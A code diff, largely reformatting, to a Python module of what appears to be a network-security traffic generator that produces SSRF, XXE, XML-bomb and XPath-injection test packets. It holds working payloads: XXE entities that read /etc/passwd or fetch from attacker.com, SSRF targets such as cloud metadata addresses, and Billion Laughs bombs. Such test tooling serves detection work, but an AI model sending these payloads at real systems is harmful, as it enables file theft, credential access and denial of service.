@@ -8,11 +8,11 @@ from scapy.packet import Packet, Raw
 
 from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule
 
-# SSRF target patterns (internal IP addresses)
-SSRF_TARGETS = [
+# SSRF target patterns (internal IP addresses) - test payloads only
+SSRF_TARGETS = [  # nosec B104 - these are test payloads, not bindings
     "127.0.0.1",
     "localhost",
-    "0.0.0.0",
+    "0.0.0.0",  # nosec B104
     "169.254.169.254",  # AWS metadata
     "metadata.google.internal",  # GCP metadata
     "10.0.0.1",
@@ -27,51 +27,53 @@ SSRF_TARGETS = [
 # XXE payloads
 XXE_PAYLOADS = [
     # Basic XXE
-    '''<?xml version="1.0"?>
+    """<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<foo>&xxe;</foo>''',
+<foo>&xxe;</foo>""",
     # XXE with parameter entity
-    '''<?xml version="1.0"?>
+    """<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
   %xxe;
 ]>
-<foo>test</foo>''',
+<foo>test</foo>""",
     # Blind XXE
-    '''<?xml version="1.0"?>
+    """<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "http://attacker.com/?data=test">
 ]>
-<foo>&xxe;</foo>''',
+<foo>&xxe;</foo>""",
     # XXE via XInclude
-    '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+    """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="file:///etc/passwd"/>
-</foo>''',
+</foo>""",
     # XXE with CDATA
-    '''<?xml version="1.0"?>
+    """<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<foo><![CDATA[&xxe;]]></foo>''',
+<foo><![CDATA[&xxe;]]></foo>""",
 ]
 
 # XML Bomb patterns (Billion Laughs)
 XML_BOMBS = [
-    '''<?xml version="1.0"?>
+    """<?xml version="1.0"?>
 <!DOCTYPE lolz [
   <!ENTITY lol "lol">
   <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
   <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 ]>
-<lolz>&lol3;</lolz>''',
+<lolz>&lol3;</lolz>""",
     # Quadratic blowup
     '''<?xml version="1.0"?>
 <!DOCTYPE kaboom [
-  <!ENTITY a "''' + "A" * 100 + '''">
+  <!ENTITY a "'''
+    + "A" * 100
+    + """">
 ]>
-<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</kaboom>''',
+<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</kaboom>""",
 ]
 
 # XPath injection payloads
@@ -109,9 +111,7 @@ class SSRFXXEModule(TrafficModule):
             ports=[80, 443, 8080],
         )
 
-    def _generate_ssrf_url_param(
-        self, src_ip: str, dst_ip: str, port: int
-    ) -> Iterator[Packet]:
+    def _generate_ssrf_url_param(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
         """Generate SSRF via URL parameter."""
         target = random.choice(SSRF_TARGETS)
 
@@ -145,9 +145,7 @@ class SSRFXXEModule(TrafficModule):
         )
         yield packet
 
-    def _generate_ssrf_post_body(
-        self, src_ip: str, dst_ip: str, port: int
-    ) -> Iterator[Packet]:
+    def _generate_ssrf_post_body(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
         """Generate SSRF via POST body."""
         target = random.choice(SSRF_TARGETS)
 
@@ -155,12 +153,14 @@ class SSRFXXEModule(TrafficModule):
             f'{{"url": "http://{target}/"}}',
             f'{{"webhook": "http://{target}:8080/callback"}}',
             f'{{"image_url": "http://{target}/evil.jpg"}}',
-            f'url=http://{target}/&action=fetch',
-            f'<request><url>http://{target}/</url></request>',
+            f"url=http://{target}/&action=fetch",
+            f"<request><url>http://{target}/</url></request>",
         ]
 
         body = random.choice(post_bodies)
-        content_type = "application/json" if body.startswith("{") else "application/x-www-form-urlencoded"
+        content_type = (
+            "application/json" if body.startswith("{") else "application/x-www-form-urlencoded"
+        )
         if body.startswith("<"):
             content_type = "application/xml"
 
@@ -181,9 +181,7 @@ class SSRFXXEModule(TrafficModule):
         )
         yield packet
 
-    def _generate_xxe_attack(
-        self, src_ip: str, dst_ip: str, port: int
-    ) -> Iterator[Packet]:
+    def _generate_xxe_attack(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
         """Generate XXE injection attack."""
         payload = random.choice(XXE_PAYLOADS)
 
@@ -204,9 +202,7 @@ class SSRFXXEModule(TrafficModule):
         )
         yield packet
 
-    def _generate_xml_bomb(
-        self, src_ip: str, dst_ip: str, port: int
-    ) -> Iterator[Packet]:
+    def _generate_xml_bomb(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
         """Generate XML bomb attack (Billion Laughs)."""
         payload = random.choice(XML_BOMBS)
 
@@ -227,14 +223,13 @@ class SSRFXXEModule(TrafficModule):
         )
         yield packet
 
-    def _generate_xpath_injection(
-        self, src_ip: str, dst_ip: str, port: int
-    ) -> Iterator[Packet]:
+    def _generate_xpath_injection(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
         """Generate XPath injection attack."""
         payload = random.choice(XPATH_PAYLOADS)
 
         # URL encode special characters
         import urllib.parse
+
         encoded_payload = urllib.parse.quote(payload)
 
         http_request = (
@@ -252,9 +247,7 @@ class SSRFXXEModule(TrafficModule):
         )
         yield packet
 
-    def _generate_ssrf_header(
-        self, src_ip: str, dst_ip: str, port: int
-    ) -> Iterator[Packet]:
+    def _generate_ssrf_header(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
         """Generate SSRF via HTTP headers."""
         target = random.choice(SSRF_TARGETS)
 
@@ -317,4 +310,3 @@ class SSRFXXEModule(TrafficModule):
             yield from self._generate_xpath_injection(src_ip, dst_ip, port)
         else:
             yield from self._generate_ssrf_header(src_ip, dst_ip, port)
-
